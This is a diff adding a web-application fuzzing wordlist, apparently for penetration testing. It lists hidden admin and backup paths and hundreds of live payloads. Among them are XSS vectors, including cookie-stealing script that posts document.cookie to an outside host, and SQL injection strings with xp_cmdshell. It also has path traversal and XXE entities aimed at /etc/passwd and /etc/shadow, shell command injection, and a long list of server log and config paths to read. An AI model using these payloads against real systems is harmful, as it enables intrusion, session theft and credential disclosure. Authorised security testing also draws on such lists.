@@ -1,0 +1,764 @@
+session_log.txt
+logBlackList.txt
+5kr92black.html
+api/ 
+sql/
+tag
+special
+remote
+remoto
+secreto
+xx
+x
+xxx
+info.php
+
+index.html
+index.html~
+index.html.old
+index.php
+jmx-console
+robots.txt
+server-status
+sitemap.xml
+webdav
+wsdl
+.snv
+.git
+cgi-bin/environ.pl
+cgi-bin
+icons
+icons/README
+bak
+backup
+_backup
+frontpage
+old
+oldfiles
+upload
+download
+includes
+wp-include
+wp-includes
+xxx
+secr3t
+s3cret
+secret
+help
+root
+info.php
+phpinfo.php
+phpinfo
+x.php
+adm
+administration
+adminstrator
+csm
+_adm
+_admin
+admin~
+files
+_files
+_old
+2014
+2013
+2012
+2011
+2000
+.hidden
+.secret
+.ssh
+.ftp
+ftp
+ftp~
+~ftp
+(
+()
+')
+('
+"/>
+/>
+>
+.
+/
+%27
+%00
+`
+^'
+<
+<<
+<<<
+<>"'%;)(&+
+<?
+= --
+= ;
+= '
+|
+||
+-
+--
+--';
+;
+!
+!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+/
+//
+//*
+/.../.../.../.../.../
+/'
+../
+..\
+'
+' --
+' ;
+"
+(
+(')
+)
+[']
+{'}
+}
+@'
+@*
+*
+*|
+*/*
+*'
+\
+\'
+\\
+\\/
+\\\\?\\
+\\\\*
+&
+#
+#'
+%
+0
+\0
+00
+/%00/
+\00
+\0\0
+%00
+%00/
++%00
+\0\0\0
+\00\00
+\00\00\00
+&#0000060
+&#0000060;
+&#000060
+&#000060;
+!@#0%^#0##018387@#0^^**(()
+&#00060
+&#00060;
+&#0060
+&#0060;
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%01%02%03%04%0a%0d%0aADSF
+&#060
+&#060;
+%0a
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+%0d%0aX-Injection-Header:%20AttackValue
+0 or 1=1
+0xfffffff
+<h1>LOL</h1>
+/><h1>LOL</h1>
+<script>
+'';!--"<XSS>=&{()}
+/><script>alert(1)</script>
+<script>alert(4)</script>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<script>alert(document.cookie)</script>
+<IMG onmouseover="alert('xxs')">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=`javascript:alert("TheZakMan says, 'XSS'")`>
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+1
+-1
+-1.0
+' or '1'='1
+&#10;
+1.0
+&#10;&#13;
+&#13;
+&#13;&#10;
+1;SELECT%20*
+2
+-2
+-20
+%20
+%20|
+'%20or%201=1
+%20'sleep%2050'
+%20$(sleep%2050)
+%21
+2147483647
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+%2500
+%250a
+..%25%35%63
+..%255c
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+%26
+268435455
+-268435455
+%27%20or%201=1
+%28
+%29
+etc/passwd
+etc/passwd%00
+etc%2fpasswd
+etc%2fpasswd%00
+etc%5cpasswd
+etc%5cpasswd%00
+etc%c0%afpasswd
+etc%c0%afpasswd%00
+/../../../../../../../../%2A
+/%2A
+%2A
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%2C
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%2e%2e%2f
+..%%35%63
+..%%35c
+%3C
+%3C%3F
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3cscript%3ealert("XSS");%3c/script%3e
+..%5c
+%5C
+%5C/
+&#60
+&#60;
+%60
+65536
+%7C
+A
+/etc/issue
+/etc/motd
+/etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/security/group
+/etc/security/passwd
+/etc/security/user
+/etc/security/environ
+/etc/security/limits
+/usr/lib/security/mkuser.default
+/apache/logs/error.log
+/apache/logs/access.log
+/etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/var/www/logs/access_log
+/var/www/logs/error.log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/access.log
+/usr/local/apache/logs/error_log
+/usr/local/apache/logs/error.log
+/var/log/apache/access_log
+/var/log/apache2/access_log
+/var/log/apache/error.log
+/var/log/apache2/error.log
+/var/log/access_log
+/var/log/access.log
+/var/www/logs/error_log
+/var/www/logs/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/apache2/logs/error.log
+/apache2/logs/access.log
+/logs/error.log
+/logs/access.log
+/logs/error_log
+/logs/access_log
+/usr/local/apache2/logs/access_log
+/usr/local/apache2/logs/access.log
+/usr/local/apache2/logs/error_log
+/usr/local/apache2/logs/error.log
+/opt/lampp/logs/access_log
+/opt/lampp/logs/error_log
+/opt/xampp/logs/access_log
+/opt/xampp/logs/error_log
+/opt/lampp/logs/access.log
+/opt/lampp/logs/error.log
+/opt/xampp/logs/access.log
+/opt/xampp/logs/error.log
+/Program Files\Apache Group\Apache\logs\access.log
+/Program Files\Apache Group\Apache\logs\error.log
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/etc/httpd/conf/httpd.conf
+/etc/apache/conf/httpd.conf
+/usr/local/etc/apache/conf/httpd.conf
+/etc/apache2/httpd.conf
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache/httpd.conf
+/usr/local/apache2/httpd.conf
+/usr/local/httpd/conf/httpd.conf
+/usr/local/etc/apache/conf/httpd.conf
+/usr/local/etc/apache2/conf/httpd.conf
+/usr/local/etc/httpd/conf/httpd.conf
+/usr/apache2/conf/httpd.conf
+/usr/apache/conf/httpd.conf
+/usr/local/apps/apache2/conf/httpd.conf
+/usr/local/apps/apache/conf/httpd.conf
+/etc/apache/conf/httpd.conf
+/etc/apache2/conf/httpd.conf
+/etc/httpd/conf/httpd.conf
+/etc/http/conf/httpd.conf
+/etc/apache2/httpd.conf
+/etc/httpd/httpd.conf
+/etc/http/httpd.conf
+/etc/httpd.conf
+/opt/apache/conf/httpd.conf
+/opt/apache2/conf/httpd.conf
+/var/www/conf/httpd.conf
+/private/etc/httpd/httpd.conf
+/private/etc/httpd/httpd.conf.default
+/Volumes/webBackup/opt/apache2/conf/httpd.conf
+/Volumes/webBackup/private/etc/httpd/httpd.conf
+/Volumes/webBackup/private/etc/httpd/httpd.conf.default
+/Program Files\Apache Group\Apache\conf\httpd.conf
+/Program Files\Apache Group\Apache2\conf\httpd.conf
+/Program Files\xampp\apache\conf\httpd.conf
+/usr/local/php/httpd.conf.php
+/usr/local/php4/httpd.conf.php
+/usr/local/php5/httpd.conf.php
+/usr/local/php/httpd.conf
+/usr/local/php4/httpd.conf
+/usr/local/php5/httpd.conf
+/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf
+/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf
+/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
+/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
+/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
+/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
+/usr/local/etc/apache/vhosts.conf
+/etc/php.ini
+/bin/php.ini
+/etc/httpd/php.ini
+/usr/lib/php.ini
+/usr/lib/php/php.ini
+/usr/local/etc/php.ini
+/usr/local/lib/php.ini
+/usr/local/php/lib/php.ini
+/usr/local/php4/lib/php.ini
+/usr/local/php5/lib/php.ini
+/usr/local/apache/conf/php.ini
+/etc/php4.4/fcgi/php.ini
+/etc/php4/apache/php.ini
+/etc/php4/apache2/php.ini
+/etc/php5/apache/php.ini
+/etc/php5/apache2/php.ini
+/etc/php/php.ini
+/etc/php/php4/php.ini
+/etc/php/apache/php.ini
+/etc/php/apache2/php.ini
+/web/conf/php.ini
+/usr/local/Zend/etc/php.ini
+/opt/xampp/etc/php.ini
+/var/local/www/conf/php.ini
+/etc/php/cgi/php.ini
+/etc/php4/cgi/php.ini
+/etc/php5/cgi/php.ini
+/php5\php.ini
+/php4\php.ini
+/php\php.ini
+/PHP\php.ini
+/WINDOWS\php.ini
+/WINNT\php.ini
+/apache\php\php.ini
+/xampp\apache\bin\php.ini
+/NetServer\bin\stable\apache\php.ini
+/home2\bin\stable\apache\php.ini
+/home\bin\stable\apache\php.ini
+/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
+/usr/local/cpanel/logs
+/usr/local/cpanel/logs/stats_log
+/usr/local/cpanel/logs/access_log
+/usr/local/cpanel/logs/error_log
+/usr/local/cpanel/logs/license_log
+/usr/local/cpanel/logs/login_log
+/usr/local/cpanel/logs/stats_log
+/var/cpanel/cpanel.config
+/var/log/mysql/mysql-bin.log
+/var/log/mysql.log
+/var/log/mysqlderror.log
+/var/log/mysql/mysql.log
+/var/log/mysql/mysql-slow.log
+/var/mysql.log
+/var/lib/mysql/my.cnf
+/etc/mysql/my.cnf
+/etc/my.cnf
+/etc/logrotate.d/proftpd
+/www/logs/proftpd.system.log
+/var/log/proftpd
+/etc/proftp.conf
+/etc/protpd/proftpd.conf
+/etc/vhcs2/proftpd/proftpd.conf
+/etc/proftpd/modules.conf
+/var/log/vsftpd.log
+/etc/vsftpd.chroot_list
+/etc/logrotate.d/vsftpd.log
+/etc/vsftpd/vsftpd.conf
+/etc/vsftpd.conf
+/etc/chrootUsers
+/var/log/xferlog
+/var/adm/log/xferlog
+/etc/wu-ftpd/ftpaccess
+/etc/wu-ftpd/ftphosts
+/etc/wu-ftpd/ftpusers
+/usr/sbin/pure-config.pl
+/usr/etc/pure-ftpd.conf
+/etc/pure-ftpd/pure-ftpd.conf
+/usr/local/etc/pure-ftpd.conf
+/usr/local/etc/pureftpd.pdb
+/usr/local/pureftpd/etc/pureftpd.pdb
+/usr/local/pureftpd/sbin/pure-config.pl
+/usr/local/pureftpd/etc/pure-ftpd.conf
+/etc/pure-ftpd.conf
+/etc/pure-ftpd/pure-ftpd.pdb
+/etc/pureftpd.pdb
+/etc/pureftpd.passwd
+/etc/pure-ftpd/pureftpd.pdb
+/usr/ports/ftp/pure-ftpd/
+/usr/ports/net/pure-ftpd/
+/usr/pkgsrc/net/pureftpd/
+/usr/ports/contrib/pure-ftpd/
+/var/log/pure-ftpd/pure-ftpd.log
+/logs/pure-ftpd.log
+/var/log/pureftpd.log
+/var/log/ftp-proxy/ftp-proxy.log
+/var/log/ftp-proxy
+/var/log/ftplog
+/etc/logrotate.d/ftp
+/etc/ftpchroot
+/etc/ftphosts
+/var/log/exim_mainlog
+/var/log/exim/mainlog
+/var/log/maillog
+/var/log/exim_paniclog
+/var/log/exim/paniclog
+/var/log/exim/rejectlog
+/var/log/exim_rejectlog
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+admin'--
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+\";alert('XSS');//
+^&apos;
+/&apos;
+[&apos;]
+{&apos;}
+@&apos;
+*&apos;
+\&apos;
+&apos;
+#&apos;
+&apos;%20OR
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+as
+asc
+bfilename
+..%bg%qf
+/../../../../../../../../bin/id|
+|/bin/ls -al
+\"blah
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+/boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+..%c0%af
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
+/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
+C:/boot.ini
+C:\boot.ini
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+char%4039%41%2b%40SELECT
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+../../../../../../../../conf/server.xml
+count(/child::node())
+delete
+desc
+`dir`
+|dir
+|dir|
+;dir
+distinct
+/,%ENV,/
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+/./././././././././././etc/passwd
+/../../../../../../../../../../etc/passwd
+/../../../../../../../../../../etc/passwd^^
+/..\../..\../..\../..\../..\../..\../etc/passwd
+/etc/passwd
+../../../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+../../../../../../../../../../../../etc/passwd%00
+..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+/../../../../../../../../../../../etc/passwd%00.html
+/../../../../../../../../../../../etc/passwd%00.jpg
+/./././././././././././etc/shadow
+/../../../../../../../../../../etc/shadow
+/../../../../../../../../../../etc/shadow^^
+/..\../..\../..\../..\../..\../..\../etc/shadow
+/etc/shadow
+../../../../../../../../../../../../etc/shadow
+..\..\..\..\..\..\..\..\..\..\etc\shadow
+.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+../../../../../../../../../../../../etc/shadow%00
+..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+'; exec master..xp_cmdshell
+exec sp
+exec xp
+'; exec xp_regread
+FALSE
+handler
+having
+hi' or 1=1 --
+hi" or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi" or "a"="a
+hi") or ("a"="a
+'hi' or 'x'='x';
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+`id`
+|id
+|id|
+;id;
+id%00
+id%00|
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+/index.html|id|
+insert
+like
+limit
+../../../../../../../../../../../../localstart.asp
+../../../../../../../../../../../../localstart.asp%00
+|ls
+|ls -la
+;ls -la
+&lt
+&lt;
+&LT
+&LT;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;&gt;&quot;'%;)(&amp;+
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+&ltscript&gtalert(document.cookie);</script>
+*(|(mail=*))
+<name>','')); phpinfo(); exit;/*</name>
+\n/bin/ls -al\n
+;netstat -a;
+\nnetstat -a%\n
+null
+$null
+NULL
+$NULL
+*(|(objectclass=*))
+or
+' or ''='
+' or 0=0 --
+' or 0=0 #
+" or 0=0 --
+" or 0=0 #
+or 0=0 --
+or 0=0 #
+"' or 1 --'"
+' or '1'='1'--
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 1=1 or ''='
+" or 1=1 or ""="
+or%201=1
+or%201=1 --
+' or a=a--
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+order by
+' or (EXISTS)
+'or select *
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+PRINT
+PRINT @@variable
+procedure
+&quot;;id&quot;
+;read;
+replace
+"><script>"
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+<<script>alert("XSS");//<</script>
+<script>alert("XSS")</script>
+"><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>
+<  script > < / script>
+select
+' (select top 1
+something%00html
+--sp_password
+'sqlattempt1
+(sqlattempt2)
+"\t"
+\t
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+TRUE
+truncate
+tz_offset
+\u003c
+\u003C
+..%u2215
+..%u2216
+' UNION ALL SELECT
+' UNION SELECT
+update
+'||UTL_HTTP.REQUEST
+,@variable
+@variable
+?x=
+?x=>
+?x=|
+?x="
+&#x000003c
+&#x000003c;
+&#X03c
+&#X03c;
+&#X03C
+&#X03C;
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3c
+&#x3c
+&#x3c;
+\x3C
+&#x3C
+&#x3C;
+&#X3c
+&#X3c;
+&#X3C
+&#X3C;
+\x3D \x27
+\x3D \x3B'
+#xA
+#xA#xD
+#xD
+#xD#xA
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+'';!--"<XSS>=&{()}
+<xss><script>alert('XSS')</script></vulnerable>
+">xxx<P>yyy
